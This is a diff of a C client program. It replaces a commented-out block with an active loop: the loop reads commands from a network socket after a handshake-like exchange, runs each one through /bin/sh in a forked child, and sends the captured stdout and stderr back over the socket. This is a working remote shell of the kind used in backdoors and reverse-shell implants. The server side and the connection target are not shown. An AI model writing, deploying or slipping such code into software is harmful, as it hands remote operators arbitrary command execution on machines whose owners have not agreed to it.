@@ -184,35 +184,37 @@ int main(int argc, char const* argv[]) {
     cnsm_serv_hel_plus(sock);
     snd_cli_hel_fin(sock);
 
-    /* char buf_cmd[4096] = {0};
-    int valread = read(sock, buf_cmd, 4096);
-    printf("Length: %d\nMessage: %s\n", valread, buf_cmd);
+    while (1) {
+        char buf_cmd[5000] = {0};
+        int valread = read(sock, buf_cmd, 5000);
+        printf("Length: %d\nMessage: %s\n", valread, buf_cmd);
 
-    char buf_res[4096] = {0};
-    int buf_res_s;
-    int pipes[2];
-    pid_t pid;
+        char buf_res[5000] = {0};
+        int buf_res_s;
+        int pipes[2];
+        pid_t pid;
 
-    if (pipe(pipes) == -1)
-        exit(EXIT_FAILURE);
+        if (pipe(pipes) == -1)
+            exit(EXIT_FAILURE);
 
-    if ((pid = fork()) == -1)
-        exit(EXIT_FAILURE);
+        if ((pid = fork()) == -1)
+            exit(EXIT_FAILURE);
 
-    if (pid == 0) {
-        dup2(pipes[1], STDOUT_FILENO);
-        close(pipes[0]);
-        close(pipes[1]);
-        execl("/bin/sh", "sh", "-c", buf_cmd, NULL);
-        exit(EXIT_FAILURE);
-    } else {
-        close(pipes[1]);
-        buf_res_s = read(pipes[0], buf_res, sizeof(buf_res));
-        printf("%.*s\n", buf_res_s, buf_res);
-        wait(NULL);
+        if (pid == 0) {
+            dup2(pipes[1], STDOUT_FILENO);
+            dup2(pipes[1], STDERR_FILENO);
+            close(pipes[0]);
+            close(pipes[1]);
+            execl("/bin/sh", "sh", "-c", buf_cmd, NULL);
+            exit(EXIT_FAILURE);
+        } else {
+            close(pipes[1]);
+            buf_res_s = read(pipes[0], buf_res, sizeof(buf_res));
+            wait(NULL);
+        }
+
+        send(sock, buf_res, buf_res_s, 0);
     }
-
-    send(sock, buf_res, buf_res_s, 0); */
 
     close(client_fd);
     return 0;
